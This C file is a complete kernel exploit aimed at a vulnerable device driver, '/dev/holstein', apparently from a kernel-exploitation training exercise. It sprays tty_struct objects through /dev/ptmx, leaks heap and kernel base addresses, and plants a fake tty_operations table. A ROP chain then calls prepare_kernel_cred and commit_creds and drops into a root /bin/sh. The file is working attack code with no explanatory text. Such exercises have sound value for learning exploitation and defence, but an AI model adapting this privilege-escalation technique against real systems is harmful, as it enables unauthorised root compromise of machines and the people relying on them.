#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <string.h>
#include <stddef.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define dev_file "/dev/holstein"
int global_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    if(global_fd < 0)
        errExit("Can't open dev file");
    log_info("Opened dev file");
}
char buf[0x800+0x100];
void read_dev(){
    read(global_fd,buf,sizeof(buf));
}
void write_dev(){
    write(global_fd,buf,sizeof(buf));
}
int spary[50];
int main(int argc,char** argv,char **envp){
    save_state();
    for(size_t i=0;i<25;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    open_dev();
    for(size_t i=25;i<50;i++){
        spary[i]=open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spary[i]<0)
            errExit("/dev/ptmx");
    }
    read_dev();
    //memset(buf+0x800,'A',0x4);
    int64_t* leak = (int64_t *)(buf+0x400);
    int64_t g_buf, _text;
    if( *leak == 0x100005401){
        log_info("struct tty_struct at offset 0x%lx",0x400UL);
        log_info("Leak heap: 0x%lx",leak[7]);
        g_buf = leak[7]-0x438;
        log_info("-> g_buf = 0x%lx",g_buf);
        log_info("Leak kernel: 0x%lx",leak[3]);
        log_info("-> text base: 0x%lx",leak[3]-0xc38880);
        _text = leak[3]-0xc38880;
    }
    else
        errExit("0x%lx",*(int64_t *)(buf+0x400));
    struct tty_operations fake_tty = {0};
    fake_tty.ioctl = _text+0x1077fc; // push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
    memcpy(buf,&fake_tty,sizeof(fake_tty));
    leak[3] = g_buf;
    int64_t* rop = (int64_t *)(buf+offsetof(struct tty_operations,ioctl)+8);
    int64_t rop_kernel = g_buf+offsetof(struct tty_operations,ioctl)+8;
    int64_t off=0;
    rop[off++] = 0; //r13
    rop[off++] = rop_kernel+7*8+0x28; //rbp
    rop[off++] = _text+0xd748d; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = _text + 0x74650; // prepare_kernel_cred
    rop[off++] = _text+0x2e647f; //pop rdx ; pop rcx ; pop rbx ; pop rbp ; ret
    rop[off++] = 0;  //rdx
    rop[off++] = -1; //rcx
    rop[off++] = 0;  //rbx
    rop[off++] = 0;  //rbp
    rop[off++] = _text+0x296342; //add rdx, rax ; jmp 0xffffffff81296350 -> 
//    0xffffffff81296350:  cmp    cl,BYTE PTR [rax]
//    0xffffffff81296352:  je     0xffffffff81296347
//    0xffffffff81296354:  ret
    rop[off++] = _text+0xd748d; // pop rdi ; ret ;
    rop[off++] = 0;
    rop[off++] = _text+0x2ae04; // or rdi, rax ; cmp rdx, rdi ; jne 0xffffffff8102ae0d ; ret
    rop[off++] = _text+0x744b0; // commit_creds
    rop[off++] = _text+0x800e10+22; // swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0 ; //rax
    rop[off++] = 0 ; //rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    write_dev();
    for(size_t i=0;i<50;i++){
        ioctl(spary[i],0x1234,g_buf+offsetof(struct tty_operations,ioctl)+8);
    }
};
